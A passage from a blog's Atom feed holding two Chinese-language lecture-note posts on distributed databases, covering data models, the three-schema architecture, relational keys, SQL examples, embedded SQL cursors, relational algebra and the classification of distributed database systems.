  </entry>
  
  <entry>
    <title>分布式数据库——第二章 数据与数据模型</title>
    <link href="http://JKZhang.github.io/2019/03/%E5%88%86%E5%B8%83%E5%BC%8F%E6%95%B0%E6%8D%AE%E5%BA%93%E2%80%94%E2%80%94%E7%AC%AC%E4%BA%8C%E7%AB%A0%EF%BC%9A%E6%95%B0%E6%8D%AE%E4%B8%8E%E6%95%B0%E6%8D%AE%E6%A8%A1%E5%9E%8B/"/>
    <id>http://JKZhang.github.io/2019/03/分布式数据库——第二章：数据与数据模型/</id>
    <published>2019-03-29T14:34:00.000Z</published>
    <updated>2019-04-01T13:17:49.474Z</updated>
    
    <content type="html"><![CDATA[<p>1.数据与数据模型</p><p>•数据</p><p> – 给定事实</p><p>•数据模型 </p><p>– 抽象的, 自含的, 对象和操作符等的逻辑定义, 所有这些一起组成了抽象机</p><p>•实现</p><p> – 真实机器上的物理实现</p><p>•数据抽象</p><p>–实体与联系</p><p>实体（Entities）</p><p>supplier, part, project, warehouse, employee ….</p><p>联系（Relationships）</p><p>sp, sj, spj…….</p><p>–特征 (Properties)</p><p>供应商 : location….</p><p>零件 : weight …..</p><p>2.数据独立</p><p>•数据库技术的主要目标</p><p>•适应应用需求，数据物理表示和访问技术的改变是必要的</p><p>•两类独立性</p><ul><li><p>物理数据独立</p></li><li><ul><li>当数据库的内部存储结构发生改变时，只要修改模式/内模式映象，可保持概念模式不变，从而保持外模式以及用户程序的不变，保证了数据与程序的物理独立性——数据的物理独立性</li></ul></li><li><p>逻辑数据独立</p></li><li><ul><li>当概念模式发生改变时，只要修改外模式/模式映象，可保持外模式不变，从而保持用户应用程序不变，保证了数据与用户程序的逻辑独立性——数据的逻辑独立性</li></ul></li></ul><p>3.体系结构</p><p>•三层体系结构</p><p><img src="//JKZhang.github.io/2019/03/分布式数据库——第二章：数据与数据模型/clip_image001.png" alt="clip_image001"></p><p>•外模式</p><ul><li>单个用户所看到的局部数据的逻辑结构和特征的描述</li><li>建立在概念模式之上，同一概念模式上可有多个不同的外模式</li><li>通过外模式DDL进行定义</li></ul><p>•概念模式</p><ul><li>数据库中全体数据的逻辑结构和特征的描述</li><li>一个数据库只有一个概念模式</li><li>通过模式DDL进行定义</li></ul><p>•内模式</p><ul><li>数据物理结构和存储方式的描述</li><li>一个数据库只有一个内模式</li><li>通过内模式DDL定义</li></ul><p>4.关系模型</p><p>•术语</p><ul><li><p>域 （Domain）</p></li><li><ul><li>一组具有相同数据类型的值的集合。每个属性有一个域</li></ul></li><li><p>属性 （Attribute）</p></li><li><ul><li>二维表格的每一列</li></ul></li><li><p>元组 （Tuple）</p></li><li><ul><li>每一行称为关系的一个元组</li></ul></li><li><p>基数 （Cardinality） 元组的数目</p></li><li><p>度 （Degree） 列的数目</p></li></ul><p>•性质</p><ul><li><p>一个关系是一个规范化的二维表格</p></li><li><ul><li>属性值不可分解</li></ul></li></ul><p>不允许表中有表</p><ul><li>元组不可重复</li></ul><p>因此一个关系模式至少存在一个候选码</p><ul><li>没有行序，即元组之间无序</li></ul><p>关系是元组的集合，集合的元素是无序的</p><ul><li>没有列序，即属性之间无序</li></ul><p>关系模式是属性的集合</p><p>•操作</p><ul><li>选择 （select）</li></ul><p>从表中抽取指定的行</p><ul><li>投影 （ Project）</li></ul><p>从表中抽取指定的列</p><ul><li>连接 （Join）</li></ul><p>在公共列的基础上连接两个表</p><ul><li>以集合为单元操作</li></ul><p>算子和结果都是表</p><ul><li>闭包性质</li></ul><p>一个操作的的输出结果可以是另一个操作的输入</p><p>•Key</p><ul><li>候选键（Candidate Keys）</li></ul><p>当且仅当如下条件成立K 是关系R候选键</p><ul><li>唯一性（Uniqueness）</li><li>最小性（Irreducibility）</li><li>e.g. S(s#) 是键,</li></ul><p>S(s#, age) 是超键（ super key ）</p><ul><li>主关键字(Primary Keys)与候选键</li></ul><p>Primary key 是被关系选中的候选键</p><ul><li>主关键字不能取空值（not null）</li><li>外关键字（Foreign Key）</li></ul><p>– R2 是一关系, R2 中的外关键字是R2的一组属性, FK, 满足:</p><ul><li>存在关系R1 有候选键 CK</li><li><p>R2 中的每个FK 值一定与 R1中某个元组的CK值相等.</p></li><li><p>引用完整性</p></li></ul><p>数据库不能含有任何不匹配的外关键字</p><ul><li>ON DELETE</li></ul><p>CASCADE/RESTRICT/NO ACTION</p><ul><li>ON UPDATE</li></ul><p>CASCADE/RESTRICT/NO ACTION</p><p>解释：引用关系做删除和更新操作的影响：CASCADE跟随一起变化，RESTRICT受限，不允许删除和更新，NO ACTION 不变化——引用完整性受到影响。</p><p>•语言 （SQL，代数）</p><ul><li><p>DDL 数据库定义语言</p></li><li><ul><li>创建create</li></ul></li></ul><p>– Table</p><p>– View</p><p>– Index</p><ul><li>例：</li></ul><p>创建表：</p><p>Create Table DEPT ( DEPT# Number,</p><p>DNAME Char(5),</p><p>Budget Number( 7,2));</p><p>创建索引：</p><p>Create index I1 on EMP (E#);</p><p>Create index I2 on EMP (Ename);</p><p>创建唯一性索引：</p><p>Create unique index I1 on EMP (E#);</p><p>创建聚集索引（</p><p>元组按照索引值顺序，物理上尽可能的存储在一起 ,在索引值上执行扫描（scan）操作时可以减少 I/O.）：</p><p>Create cluster index CI1 on EMP (E#);</p><p>含有完整性定义得关系定义例子：</p><p>Create Table SP ( s# s# not null,</p><p>p# p# not null, qty qty not null,</p><p>primary key (s#, p#),</p><p>foreign key (s#) references S</p><p>on delete cascade</p><p>on update cascade,</p><p>foreign key (p#) references P</p><p>on delete cascade</p><p>on update cascade,</p><p>check (qty &gt;0 and qty &lt;5001) );</p><ul><li><p>DML数据库操纵语言</p></li><li><ul><li>查询select</li></ul></li><li><ul><li>例：</li></ul></li></ul><p>查询年龄40岁以下不同部门平均工资大于6000的部门，并按部门降序列表。</p><p>select d#, avg (SAL) from EMP where age &lt; 40</p><p>group by d# having avg (SAL) &gt; 6000</p><p>order by d# desc；</p><p>查询在sale部门工作的职工名。</p><p>select distinct Ename from EMP where d# in</p><p>(select d# from DEPT</p><p>where Dname=‘sale’)</p><p>查询缺少某门课成绩的学生学号。</p><p>Select s# From SC Where score IS NULL</p><p>查询只选修了1门或2门课程的学生学号、姓名和课程数。</p><p>Select student.s#, sname, count_c# From (Select s# as s#, count(s#) as count_c# From sc Group by s#) SC2, student Where sc2.s# = student.s# and (count_c#=1 OR count_c#=2)</p><ul><li><p>删除delete</p></li><li><p>例：</p></li></ul><p>删除所有低于平均工资的职工 。</p><p>delete from EMP where SAL &lt; (select avg (SAL) from EMP)</p><ul><li><p>插入insert</p></li><li><p>例：</p></li></ul><p>insert into S (status, city, s#, sname) values (20, ‘shanghai’, ‘s6’, ‘wang ping’ )；</p><p>对所有在黄山路 支行的贷款者$200 存款的礼物。</p><p>insert into account select loan-number, branch-name, 200 from loan where branch-name = ‘huangshanlu’</p><ul><li><p>更新update</p></li><li><p>例：</p></li></ul><p>工资大于 $4,000 的增加 6%, 其他职工工资增加 5%.</p><p><img src="//JKZhang.github.io/2019/03/分布式数据库——第二章：数据与数据模型/clip_image002.png" alt="clip_image002"></p><ul><li><p>嵌入SQL</p></li><li><ul><li>单元组查询</li></ul></li></ul><p>EXEC SQL Select Ename INTO :ename</p><p>From EMP Where e# = ‘e1’</p><ul><li>查询供应了amount 数量零件的供应商名字和其所在的城市，先定义游标（ cursor）</li></ul><p>EXEC SQL</p><p>declare c cursor for </p><p>select sname, city </p><p>from S, SP</p><p>where S.s# = SP.s# </p><p>and SP.QTY &gt; :amount</p><p>游标打开语句（ open ），执行游标查询</p><p>EXEC SQL open c</p><p>游标取语句（fetch ）获取一个元组送入主变量</p><p>EXEC SQL fetch c into :cn, :cc</p><p>通过循环调用fetch语句，获取所有元组</p><p>游标关闭语句（ close ）</p><p>EXEC SQL close c</p><p>游标更新定义</p><p>declare c cursor for select * from EMP where city = ‘Parise’ for update</p><p>修改当前游标元组</p><p>update EMP set SAL = SAL + 100 where current of c</p><ul><li>关系代数</li></ul><p><img src="//JKZhang.github.io/2019/03/分布式数据库——第二章：数据与数据模型/clip_image003.png" alt="clip_image003"></p><ul><li>关系代数的符号</li></ul><p><img src="//JKZhang.github.io/2019/03/分布式数据库——第二章：数据与数据模型/clip_image004.png" alt="clip_image004"></p><ul><li><p>关系代数表达式</p></li><li><ul><li>并</li></ul></li></ul><p>R∪S＝｛t∣t∈R∨t∈S｝</p><p>–t是元组变量</p><p>–R和S是关系代数表达式</p><p>–R与S的degree必须相同</p><p>–R与S的属性类型必须相同</p><p><img src="//JKZhang.github.io/2019/03/分布式数据库——第二章：数据与数据模型/clip_image005.png" alt="clip_image005"></p><ul><li>交</li></ul><p>R∩S＝｛t∣t∈R∧t∈S｝</p><p><img src="//JKZhang.github.io/2019/03/分布式数据库——第二章：数据与数据模型/clip_image006.png" alt="clip_image006"></p><ul><li>差</li></ul><p><img src="//JKZhang.github.io/2019/03/分布式数据库——第二章：数据与数据模型/clip_image007.png" alt="clip_image007"></p><p><img src="//JKZhang.github.io/2019/03/分布式数据库——第二章：数据与数据模型/clip_image008.png" alt="clip_image008"></p><ul><li>积</li></ul><p><img src="//JKZhang.github.io/2019/03/分布式数据库——第二章：数据与数据模型/clip_image009.png" alt="clip_image009"></p><p><img src="//JKZhang.github.io/2019/03/分布式数据库——第二章：数据与数据模型/clip_image010.png" alt="clip_image010"></p><ul><li>选择</li></ul><p><img src="//JKZhang.github.io/2019/03/分布式数据库——第二章：数据与数据模型/clip_image011.png" alt="clip_image011"></p><p>–水平划分关系</p><p>–F是一个逻辑表达式，表示所选的元组应满足的条件</p><p>–F由逻辑运算符┐(NOT)、∧(AND)、∨(OR)连接算术表达式构成</p><p>•算术表达式<img src="//JKZhang.github.io/2019/03/分布式数据库——第二章：数据与数据模型/clip_image012.png" alt="clip_image012">形为XθY，θ可以是&gt;,&lt;,=, ≤,≥或≠，X和Y可以是属性名、常量或简单函数</p><ul><li>投影</li></ul><p> <img src="//JKZhang.github.io/2019/03/分布式数据库——第二章：数据与数据模型/clip_image013.png" alt="clip_image013"></p><p><img src="//JKZhang.github.io/2019/03/分布式数据库——第二章：数据与数据模型/clip_image014.png" alt="clip_image014"></p><ul><li>自然联接</li></ul><p>设R的属性集为{X,Y}，S的属性集为{Y,Z}</p><p>R∞S=t|t=&lt;X,Y,Z&gt;∧t[X,Y]∈R∧t[Y,Z]∈S}</p><p>–相当于在R×S中选取R和S的所有公共属性值都相等的元组，并在结果中去掉重复属性</p><p> <img src="//JKZhang.github.io/2019/03/分布式数据库——第二章：数据与数据模型/clip_image015.png" alt="clip_image015"></p><ul><li>θ联接</li></ul><p> <img src="//JKZhang.github.io/2019/03/分布式数据库——第二章：数据与数据模型/clip_image016.png" alt="clip_image016"></p><p> <img src="//JKZhang.github.io/2019/03/分布式数据库——第二章：数据与数据模型/clip_image017.png" alt="clip_image017"></p><ul><li>等值联接</li></ul><p>在θ联接中，当θ为等号时，称为“等值联接”</p><p>等值联接是θ联接中比较常见的形式</p><p><img src="//JKZhang.github.io/2019/03/分布式数据库——第二章：数据与数据模型/clip_image018.png" alt="clip_image018"></p><ul><li>关系代数封闭性</li></ul><p>任意关系代数操作的结果仍是一个关系</p><p>关系代数的封闭性保证了关系代数操作的可嵌套性</p><ul><li>关系代数-删除</li></ul><p>例：“从数据库中删除姓名为‘Rose’的学生”</p><p>Student←Student－σname=‘Rose’(Student)</p><ul><li>关系代数-插入</li></ul><p>例：插入一个新的学生</p><p>S1←S1∪ { (‘001’,’Rose’,19) }</p><ul><li>关系代数-修改</li></ul><p>例：“将所有男学生的学号前加上字母M”</p><p>Student←π‘M’||sno,name, sex, age(σsex=‘M’(Student)) ∪ (Student－σsex=‘M’(Student))</p><ul><li>关系代数-查询</li></ul><p>例：查询所有状态大于20的供应商的供应商号</p><p><img src="//JKZhang.github.io/2019/03/分布式数据库——第二章：数据与数据模型/clip_image019.png" alt="clip_image019"></p><p>​         查询供应了London城市中零件的供应商号</p><p><img src="//JKZhang.github.io/2019/03/分布式数据库——第二章：数据与数据模型/clip_image020.png" alt="clip_image020"></p><p>查询状态大于20并且没有零件的城市</p><p><img src="//JKZhang.github.io/2019/03/分布式数据库——第二章：数据与数据模型/clip_image021.png" alt="clip_image021"></p><ul><li>关系代数与SQL</li></ul><p>例：</p><p>供应商关系模式：S (S#, SNAME, STATUS, CITY)</p><p>求住在同一个城市里的供应商号码对</p><p> <img src="//JKZhang.github.io/2019/03/分布式数据库——第二章：数据与数据模型/clip_image022.png" alt="clip_image022"></p><p><img src="//JKZhang.github.io/2019/03/分布式数据库——第二章：数据与数据模型/clip_image023.png" alt="clip_image023"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;1.数据与数据模型&lt;/p&gt;
&lt;p&gt;•数据&lt;/p&gt;
&lt;p&gt; – 给定事实&lt;/p&gt;
&lt;p&gt;•数据模型 &lt;/p&gt;
&lt;p&gt;– 抽象的, 自含的, 对象和操作符等的逻辑定义, 所有这些一起组成了抽象机&lt;/p&gt;
&lt;p&gt;•实现&lt;/p&gt;
&lt;p&gt; – 真实机器上的物理实现&lt;/p&gt;
&lt;p&gt;•数
      
    
    </summary>
    
      <category term="数据库" scheme="http://JKZhang.github.io/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
    
      <category term="数据库" scheme="http://JKZhang.github.io/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
      <category term="分布式" scheme="http://JKZhang.github.io/tags/%E5%88%86%E5%B8%83%E5%BC%8F/"/>
    
  </entry>
  
  <entry>
    <title>分布式数据库——第一章 高级数据库概述</title>
    <link href="http://JKZhang.github.io/2019/03/%E5%88%86%E5%B8%83%E5%BC%8F%E6%95%B0%E6%8D%AE%E5%BA%93%E2%80%94%E2%80%94%E7%AC%AC%E4%B8%80%E7%AB%A0%EF%BC%9A%E9%AB%98%E7%BA%A7%E6%95%B0%E6%8D%AE%E5%BA%93%E6%A6%82%E8%BF%B0/"/>
    <id>http://JKZhang.github.io/2019/03/分布式数据库——第一章：高级数据库概述/</id>
    <published>2019-03-29T13:00:00.000Z</published>
    <updated>2019-03-29T14:16:31.680Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第一章-高级数据库概述"><a href="#第一章-高级数据库概述" class="headerlink" title="第一章 高级数据库概述"></a>第一章 高级数据库概述</h1><p>1.数据与存储系统</p><p>•存储层次</p><ul><li>Register</li><li>Cache</li><li>主存（Main memory）</li><li>辅存（Disk）</li></ul><p>•新型存储体系</p><p><img src="//JKZhang.github.io/2019/03/分布式数据库——第一章：高级数据库概述/clip_image001.png" alt="clip_image001"></p><p>2.数据库系统发展</p><p>•数据模型</p><ul><li>数据结构, 操作</li><li>层次, 网状, 关系, OO, 时态, 空间, 图, 时空, 文本, 工程, 生物, 地理, 图像数据库等</li></ul><p>•运行环境</p><ul><li>集中式, 分布式, 并行,移动, Cluster, Web, 嵌入，云等</li></ul><p>•计算方式</p><ul><li>被动/主动, 实时数据库</li><li>批处理/流处理等</li></ul><p>•数据库（DB）</p><ul><li>可以存储长时间的信息集合</li></ul><p>•数据库管理系统（DBMS）</p><ul><li>允许用户使用专门的数据定义语言和操作语言, 支持大数据量数据的长时间存储,并能正确控制多个用户对数据有效存取的软件</li></ul><p>3.关系模型与面向对象模型</p><p><img src="//JKZhang.github.io/2019/03/分布式数据库——第一章：高级数据库概述/clip_image002.png" alt="clip_image002"></p><p>•概念层 ——直接面对用户</p><ul><li>语义表达能力强</li><li>易于被用户理解</li><li>独立于任何DBMS</li><li>易于向逻辑模型转换</li></ul><p>•逻辑层 ——数据模型</p><ul><li>用户通过DBMS看到的现实世界</li><li>传统的DBMS模型：层次，网络，关系模型</li><li>新型的DBMS模型：O—O模型，对象—关系模型等</li></ul><p>•物理层 ——对用户透明</p><ul><li>数据的表示（存储格式）</li><li>数据的索引</li><li>高效的操作实现</li><li>一致性维护及故障处理</li></ul><p>•为什么需要OODB</p><p>一些数据结构复杂，难于用关系模型描述。</p><p>•面向对象模型 —— OO模型</p><ul><li><p>基本概念：</p></li><li><ul><li>对象标识 OID</li><li>对象封装</li><li>类和类的嵌套</li><li>类和类的继承</li><li>持久对象概念</li></ul></li><li><p>数据模型</p></li></ul><p>用对象与类结构以及类间继承与组合关系建立数据间的复杂结构关系</p><ul><li>模式上的操作</li></ul><p>用对象与类中方法构作模式上的操作，这种操作语义远强于传统数据模型</p><ul><li><p>OODBMS必须满足两个基本条件</p></li><li><ul><li>支持核心的面向对象数据模型</li><li>支持传统数据库系统所具有的数据库特征</li></ul></li></ul><p>•特化、泛化</p><p> <img src="//JKZhang.github.io/2019/03/分布式数据库——第一章：高级数据库概述/clip_image003.png" alt="clip_image003"></p><p><img src="//JKZhang.github.io/2019/03/分布式数据库——第一章：高级数据库概述/clip_image004.png" alt="clip_image004"></p><p><img src="//JKZhang.github.io/2019/03/分布式数据库——第一章：高级数据库概述/clip_image005.png" alt="clip_image005"></p><p><img src="//JKZhang.github.io/2019/03/分布式数据库——第一章：高级数据库概述/clip_image006.png" alt="clip_image006"></p><p>•概念模型及其描述工具</p><ul><li>E/R 模型：实体—联系模型</li></ul><p>–用实体描述对象属性</p><p>–用联系描述对象间的语义关系</p><ul><li>基于UML的面向对象的模型 （Unified Modeling      Language）</li></ul><p>–静态对象模型</p><ul><li>描述对象的属性，关联，聚合，继承，等等</li></ul><p>–动态对象模型</p><ul><li>描述对象行为，相互作用，合作和变化，等等</li></ul><p>–支持概念模型与逻辑模型无缝联接</p><ul><li>基于XML的对象模型</li></ul><p>–易学，易扩充</p><p>–易于快速开发软件</p><p>–多个工具可以支持结构转换</p><p>4.集中式系统与分布式系统</p><p>•分布式数据库系统</p><ul><li><p>定义: 物理上分散而逻辑上集中的数据库系统.</p></li><li><p>特点</p></li><li><ul><li>物理分布性</li></ul></li></ul><p>数据不在单个Site上, 按全局需求将数据划分成一定的数据子集, 分散存储在各个Site上</p><ul><li>逻辑整体性</li></ul><p>各个Site上的数据子集, 相互间有严密的约束规则加以限定, 逻辑上是一个整体</p><ul><li>站点自治性</li></ul><p>各个Site上的数据(即LDB)是由本地的DBMS管理, 具有自治处理能力</p><p>•为什么需要分布式系统</p><ul><li>分布为并行执行提供了可能性</li><li>复制增加了可用性</li></ul><p>•分布式数据库分类</p><ul><li><p>同构型(Homogeneous)</p></li><li><ul><li>各个Site上的DB数据模型相同</li><li>进一步可分为</li></ul><p>同构同质型</p><p>同构异质型</p></li><li><p>异构型(Heterogeneous)</p></li></ul><p>各个Site上的DB数据模型不同</p><ul><li>集中型</li></ul><p>DDB的全局控制信息位于一个中心Sie上</p><ul><li>分散型</li></ul><p>每个Site上包含有全局控制信息的一个Copy</p><ul><li>可变型</li></ul><p>DDB分成两组, 一组Site包含全局控制信息Copy(主Site), 另一组不含全局Copy(辅Site)</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;第一章-高级数据库概述&quot;&gt;&lt;a href=&quot;#第一章-高级数据库概述&quot; class=&quot;headerlink&quot; title=&quot;第一章 高级数据库概述&quot;&gt;&lt;/a&gt;第一章 高级数据库概述&lt;/h1&gt;&lt;p&gt;1.数据与存储系统&lt;/p&gt;
&lt;p&gt;•存储层次&lt;/p&gt;
&lt;ul&gt;
&lt;l
      
    
    </summary>
    
      <category term="数据库" scheme="http://JKZhang.github.io/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
    
      <category term="数据库" scheme="http://JKZhang.github.io/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
      <category term="分布式" scheme="http://JKZhang.github.io/tags/%E5%88%86%E5%B8%83%E5%BC%8F/"/>
    
  </entry>
  
</feed>
